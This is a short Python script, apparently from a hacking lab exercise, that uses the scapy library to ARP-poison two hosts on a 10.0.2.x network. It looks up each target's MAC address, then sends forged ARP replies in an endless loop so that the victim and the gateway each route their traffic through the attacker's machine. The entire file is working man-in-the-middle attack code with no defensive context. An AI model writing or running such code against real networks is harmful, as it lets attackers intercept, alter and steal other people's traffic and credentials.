#!/usr/bin/env python

import scapy.all as scapy
import time

def spoof(target_id,spoof_id):  
    target_mac = get_mac(target_id)
    arp_response =  scapy.ARP(op=2,psrc=spoof_id,pdst=target_id,hwdst=target_mac)
    scapy.send(arp_response)    

def get_mac(ip):        
    arp = scapy.ARP(pdst=ip)
    boardcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_boardcast = boardcast/arp
    answered_list = scapy.srp(arp_boardcast,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc    

while True:
    spoof("10.0.2.4","10.0.2.1")
    spoof("10.0.2.1","10.0.2.4")
    time.sleep(2)


